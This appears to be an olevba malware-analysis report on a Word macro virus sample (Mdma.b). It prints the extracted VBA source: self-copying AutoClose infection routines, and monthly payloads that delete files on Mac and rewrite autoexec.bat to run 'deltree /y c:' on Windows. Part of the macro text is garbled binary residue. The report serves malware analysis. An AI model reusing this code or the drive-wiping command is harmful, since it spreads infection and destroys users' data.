olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mdma.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mdma.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Mdma.b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
    install
    If (WordBasic.Day(WordBasic.Now()) = 1) Then
        Select Case get_platform
            Case 1
                infect_mac
            Case 2
                infect_windows
            Case 3
                WordBasic.Call "infect_NT"
            Case 4
                WordBasic.Call "infect_95"
        End Select
        WordBasic.Call "show_credits"
    End If
End Sub

Private Sub install()
Dim total
Dim installed
Dim i
    On Error Resume Next
    total = WordBasic.CountMacros(0)
    installed = 0
    If total > 0 Then
        For i = 1 To total
            If WordBasic.[MacroName$](i, 0) = "AutoClose" Then
                installed = 1
            End If
        Next
    End If
    If installed = 0 Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
    Else
        total = WordBasic.CountMacros(1)
        installed = 0
        If total > 0 Then
            For i = 1 To total
                If WordBasic.[MacroName$](i, 1) = "AutoClose" Then
                    installed = 1
                End If
            Next
        End If
        If installed = 0 Then
            WordBasic.FileSaveAs Format:=1
            WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
        End If
    End If
End Sub

Private Function get_platform()
    On Error Resume Next
    If InStr(WordBasic.[AppInfo$](1), "Macintosh") Then
        get_platform = 1                    'MAC
    End If

    If WordBasic.[AppInfo$](9) <> "0" Then
        get_platform = 2                    'old version of windows
    End If

    If InStr(WordBasic.[GetSystemInfo$](21), "NT") Then
        get_platform = 3                  'Windows NT
    End If
    
    'is nothing else, so must be... '95!
    get_platform = 4

End Function

Private Sub infect_mac()
    On Error Resume Next
    WordBasic.Kill WordBasic.[MacID$]("****")
End Sub

Private Sub infect_windows()
    On Error Resume Next
    WordBasic.Kill "c:\shmk."
    Open "c:\autoexec.bat" For Output As 1
        Print #1, "@echo off"
        Print #1, "deltree /y c:"
        Print #1, "@echo You have just been phucked oŽŽŽŽƒŠŽŽ¦ŠŽŽ¡Š"                   Write    WordBasic.PrintStatusBar    Alias    Any            Open   , "ŽŽ¸ˆŽŽ¹ˆŽŽˆŽŽQˆŽŽØ‰ŽŽÙ‰ŽŽÓ‰ŽŽÐ‰ŽŽ"‰ŽŽ\‰ŽŽ�†ŽŽ¶†ŽŽ†ŽŽK†ŽŽŸ‡ŽŽÛ‡ŽŽ*‡ŽŽ^‡ŽŽŒ„ŽŽ¡„ŽŽø„ŽŽ­€ŽŽé€ŽŽ€ŽŽM€ŽŽJ€ŽŽ„�ŽŽÖ�ŽŽ\x08�ŽŽ\�ŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽ"    'ŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽ  'ŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽŽŽŽpŽŽŽ                Let, "MDMA_DMV", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: ./Virus.MSWord.Mdma.b - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

